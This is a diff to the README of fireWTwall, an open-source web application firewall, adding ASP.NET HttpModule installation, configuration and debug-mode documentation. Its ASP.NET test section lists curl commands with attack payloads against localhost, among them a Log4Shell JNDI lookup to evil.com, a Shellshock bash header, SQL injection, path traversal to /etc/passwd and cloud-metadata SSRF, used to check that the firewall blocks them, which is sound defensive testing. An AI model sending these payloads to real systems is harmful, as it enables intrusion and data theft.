@@ -13,13 +13,14 @@
 > **Designed, built and maintained by [saarors](https://github.com/saarors)**
 
 A production-ready **Web Application Firewall (WAF)** with **zero external runtime dependencies**.
-Available as an **npm package** for Node.js, Bun, and Express — and as a drop-in **PHP auto-prepend file**.
+Available as an **npm package** for Node.js, Bun, and Express — as a drop-in **PHP auto-prepend file** — and as an **ASP.NET HttpModule** for classic .NET Web Forms / MVC.
 
-| Version | Runtime | Install | Package |
-|---------|---------|---------|---------|
-| **Node.js** | Node.js >= 16 | `npm install firewtwall` | [![npm](https://img.shields.io/npm/v/firewtwall)](https://www.npmjs.com/package/firewtwall) |
-| **Bun** | Bun >= 1.0.0 | `bun add firewtwall` | [![bun](https://img.shields.io/badge/bun-1.0.0-blue)](https://www.npmjs.com/package/firewtwall) |
-| **PHP** | PHP >= 8.0 | `composer require saarors/firewtwall-php` | [![Packagist](https://img.shields.io/packagist/v/saarors/firewtwall-php)](https://packagist.org/packages/saarors/firewtwall-php) |
+| Version | Runtime | Install |
+|---------|---------|---------|
+| **Node.js** | Node.js >= 16 | `npm install firewtwall` [![npm](https://img.shields.io/npm/v/firewtwall)](https://www.npmjs.com/package/firewtwall) |
+| **Bun** | Bun >= 1.0.0 | `bun add firewtwall` |
+| **PHP** | PHP >= 8.0 | `composer require saarors/firewtwall-php` [![Packagist](https://img.shields.io/packagist/v/saarors/firewtwall-php)](https://packagist.org/packages/saarors/firewtwall-php) |
+| **ASP.NET** | .NET Framework 4.7.2+ | Copy `aspnet/src/` into your project |
 
 All versions share the same rule sets, detection philosophy, and NDJSON log format.
 
@@ -43,12 +44,18 @@ All versions share the same rule sets, detection philosophy, and NDJSON log form
    - [Configuration](#configuration-phpconfigwafconfigphp)
    - [Rate limiter storage](#rate-limiter-storage)
    - [Debug mode (PHP)](#debug-mode-php)
-4. [Middleware pipeline](#middleware-pipeline)
-5. [Log format](#log-format)
-6. [Security headers](#security-headers-added-to-every-response)
-7. [Project structure](#project-structure)
-8. [Important notes](#important-notes)
-9. [License & credits](#license)
+4. [ASP.NET (.aspx)](#aspnet-aspx)
+   - [Requirements](#aspnet-requirements)
+   - [Installation](#aspnet-installation)
+   - [Configuration](#aspnet-configuration)
+   - [Debug mode (ASP.NET)](#debug-mode-aspnet)
+   - [Test commands (ASP.NET)](#test-commands-aspnet)
+5. [Middleware pipeline](#middleware-pipeline)
+6. [Log format](#log-format)
+7. [Security headers](#security-headers-added-to-every-response)
+8. [Project structure](#project-structure)
+9. [Important notes](#important-notes)
+10. [License & credits](#license)
 
 ---
 
@@ -515,6 +522,183 @@ Set `'debug' => true` in `waf.config.php`. The same `X-WAF-*` response headers a
 
 ---
 
+## ASP.NET (.aspx)
+
+fireWTwall runs as a standard `IHttpModule` — the same mechanism used by ASP.NET's built-in security features. It fires on **every** request before your code runs, regardless of whether the target is an `.aspx` page, MVC controller, Web API endpoint, or `.ashx` handler.
+
+### ASP.NET Requirements
+
+- .NET Framework **4.7.2** or later
+- IIS 7.5+ or IIS Express
+- `System.Web`, `System.Runtime.Caching`, and `System.Web.Extensions` assemblies (all included in .NET 4.7.2+)
+
+### ASP.NET Installation
+
+**Step 1 — Add the source files to your project.**
+
+Copy the `aspnet/src/` directory into your web project or a referenced class library:
+
+```
+YourProject/
+├── FireWTWall/
+│   ├── WafHttpModule.cs      ← IHttpModule entry point
+│   ├── WAF.cs                ← 17-step pipeline
+│   ├── WafConfig.cs          ← Singleton configuration
+│   ├── WafRequest.cs         ← HttpContext wrapper
+│   ├── WafResponse.cs        ← Block responses + security headers
+│   ├── WafLogger.cs          ← NDJSON logger
+│   ├── IpFilter.cs           ← CIDR blacklist / whitelist
+│   ├── RateLimiter.cs        ← MemoryCache sliding-window limiter
+│   ├── DdosProtection.cs     ← 7-layer DDoS protection
+│   └── detectors/            ← 17 individual threat detectors
+│       └── ...
+└── Web.config
+```
+
+**Step 2 — Register the HttpModule in `Web.config`:**
+
+```xml
+<configuration>
+  <system.webServer>
+    <!-- IIS Integrated pipeline (recommended) -->
+    <modules>
+      <add name="FireWTWallModule" type="FireWTWall.WafHttpModule" />
+    </modules>
+  </system.webServer>
+
+  <!-- IIS Classic pipeline (legacy) -->
+  <system.web>
+    <httpModules>
+      <add name="FireWTWallModule" type="FireWTWall.WafHttpModule" />
+    </httpModules>
+  </system.web>
+</configuration>
+```
+
+That's it. The WAF now intercepts every request automatically.
+
+---
+
+### ASP.NET Configuration
+
+Override defaults in `Global.asax.cs` `Application_Start`:
+
+```csharp
+protected void Application_Start(object sender, EventArgs e)
+{
+    WafConfig.Current.Mode              = "log-only";  // start in audit mode
+    WafConfig.Current.ResponseType      = "json";      // or "html"
+
+    WafConfig.Current.RateLimit.MaxRequests       = 100;
+    WafConfig.Current.RateLimit.WindowSec         = 60;
+    WafConfig.Current.RateLimit.BlockDurationSec  = 600;
+
+    WafConfig.Current.MaxBodySize       = 10 * 1024 * 1024;
+
+    WafConfig.Current.Whitelist         = new[] { "127.0.0.1", "10.0.0.0/8" };
+    WafConfig.Current.Blacklist         = new[] { "203.0.113.42" };
+    WafConfig.Current.BypassPaths       = new[] { "/health", "/ping" };
+    WafConfig.Current.TrustedProxies    = new[] { "172.16.0.1" };
+
+    // Custom log path (must be writable by IIS app pool)
+    WafConfig.Current.LogPath           = Server.MapPath("~/App_Data/waf.log");
+}
+```
+
+**Key settings:**
+
+| Property | Default | Description |
+|----------|---------|-------------|
+| `Mode` | `"reject"` | `"reject"` blocks · `"log-only"` audits |
+| `MaxBodySize` | `10485760` | Max `Content-Length` in bytes |
+| `RateLimit.WindowSec` | `60` | Sliding window in seconds |
+| `RateLimit.MaxRequests` | `100` | Requests per IP per window |
+| `RateLimit.BlockDurationSec` | `600` | Block duration after violation |
+| `Whitelist` | `[]` | IPs / CIDRs that bypass all checks |
+| `Blacklist` | `[]` | IPs / CIDRs that are always blocked |
+| `BypassPaths` | `["/health","/ping"]` | URL prefixes that skip all checks |
+| `TrustedProxies` | `[]` | Enable `X-Forwarded-For` parsing |
+| `LogPath` | `App_Data/waf.log` | NDJSON log file path |
+| `ResponseType` | `"json"` | Block response: `"json"` or `"html"` |
+| `Debug` | `false` | Adds `X-WAF-*` headers (see Debug mode below) |
+
+See [docs/aspnet/configuration.md](docs/aspnet/configuration.md) for the full reference including DDoS and bot config.
+
+---
+
+### Debug mode (ASP.NET)
+
+```csharp
+WafConfig.Current.Debug = true;
+```
+
+Adds four response headers to every request and logs all passing requests:
+
+| Header | Example | Present |
+|--------|---------|---------|
+| `X-WAF-RequestId` | `f47ac10b58cc1122` | Always |
+| `X-WAF-Result` | `passed` or `blocked` | Always |
+| `X-WAF-Rule` | `sql-union-select` | Blocked only |
+| `X-WAF-Time` | `0.83ms` | Always |
+
+Tail the log in PowerShell:
+
+```powershell
+Get-Content .\App_Data\waf.log -Wait |
+    ForEach-Object { $_ | ConvertFrom-Json }
+```
+
+> ⚠️ **Never use `Debug = true` in production** — it exposes rule names in response headers.
+
+See [docs/aspnet/debug-mode.md](docs/aspnet/debug-mode.md) for full details.
+
+---
+
+### Test commands (ASP.NET)
+
+```bash
+# Clean request — should return 200
+curl -i http://localhost/
+
+# SQL injection — should return 403
+curl -i "http://localhost/?q=1+UNION+SELECT+*+FROM+users"
+
+# XSS — should return 403
+curl -i "http://localhost/?q=<script>alert(1)</script>"
+
+# Path traversal — should return 403
+curl -i "http://localhost/?file=../../etc/passwd"
+
+# Command injection — should return 403
+curl -i "http://localhost/?cmd=|whoami"
+
+# Log4Shell (CVE-2021-44228) — should return 403
+curl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' -i http://localhost/
+
+# Shellshock (CVE-2014-6271) — should return 403
+curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' -i http://localhost/
+
+# SSRF — cloud metadata — should return 403
+curl -i "http://localhost/?url=http://169.254.169.254/latest/meta-data"
+
+# Open redirect — should return 403
+curl -i "http://localhost/login?returnUrl=//evil.com"
+
+# NoSQL injection — should return 403
+curl -i "http://localhost/login?user[$ne]=x&pass[$ne]=x"
+
+# SSTI — Jinja2 — should return 403
+curl -i "http://localhost/?name={{__class__.__mro__}}"
+
+# Bad bot — should return 403
+curl -A "sqlmap/1.0" -i http://localhost/
+
+# Rate limit test — send 110 requests rapidly
+for i in {1..110}; do curl -s -o /dev/null -w "%{http_code}\n" http://localhost/; done
+```
+
+---
+
 ## Middleware pipeline
 
 Requests pass through **23 stages** (Node.js) / **22 stages** (PHP) in this order:
@@ -604,6 +788,43 @@ Every blocked request appends one NDJSON line to the log file:
 
 ```
 fireWTwall/
+├── aspnet/                          ← ASP.NET HttpModule (IIS / Web Forms / MVC)
+│   ├── src/
+│   │   ├── WafHttpModule.cs         ← IHttpModule — registered in Web.config
+│   │   ├── WAF.cs                   ← 17-step pipeline orchestrator
+│   │   ├── WafConfig.cs             ← Singleton config (set in Application_Start)
+│   │   ├── WafRequest.cs            ← HttpContext wrapper + deep URL-decode
+│   │   ├── WafResponse.cs           ← Block responses + security headers
+│   │   ├── WafLogger.cs             ← Thread-safe NDJSON logger
+│   │   ├── IpFilter.cs              ← IPv4/IPv6 CIDR whitelist/blacklist
+│   │   ├── RateLimiter.cs           ← MemoryCache sliding-window limiter
+│   │   ├── DdosProtection.cs        ← 7-layer DDoS protection
+│   │   └── detectors/
+│   │       ├── SqlInjectionDetector.cs
+│   │       ├── XssDetector.cs
+│   │       ├── PathTraversalDetector.cs
+│   │       ├── CommandInjectionDetector.cs
+│   │       ├── HeaderInjectionDetector.cs
+│   │       ├── BotDetector.cs
+│   │       ├── SsrfDetector.cs
+│   │       ├── XxeDetector.cs
+│   │       ├── OpenRedirectDetector.cs
+│   │       ├── MassAssignmentDetector.cs
+│   │       ├── SstiDetector.cs
+│   │       ├── RfiDetector.cs
+│   │       ├── Log4ShellDetector.cs
+│   │       ├── ShellshockDetector.cs
+│   │       ├── NoSqlInjectionDetector.cs
+│   │       ├── LdapInjectionDetector.cs
+│   │       └── DeserializationDetector.cs
+│   ├── example/
+│   │   ├── Default.aspx             ← Demo page
+│   │   ├── Default.aspx.cs
+│   │   ├── Global.asax              ← Configure WAF in Application_Start
+│   │   ├── Global.asax.cs
+│   │   └── Web.config               ← Registers FireWTWallModule
+│   └── logs/
+│
 ├── nodejs/                          ← npm package "firewtwall"
 │   ├── waf.js                       ← Entry: createWAF(), setStore()
 │   ├── index.d.ts                   ← TypeScript definitions
@@ -673,6 +894,14 @@ fireWTwall/
             ├── LdapInjectionDetector.php      ← 6 rules
             └── DeserializationDetector.php    ← 7 rules
 ```
+
+The `docs/aspnet/` directory contains the full ASP.NET reference:
+
+| File | Description |
+|------|-------------|
+| [docs/aspnet/installation.md](docs/aspnet/installation.md) | Source copy, class library setup, Web.config registration, log protection |
+| [docs/aspnet/configuration.md](docs/aspnet/configuration.md) | All WafConfig properties, DDoS settings, bot detection config |
+| [docs/aspnet/debug-mode.md](docs/aspnet/debug-mode.md) | X-WAF-* headers, log verbosity, PowerShell log viewer |
 
 ---
 
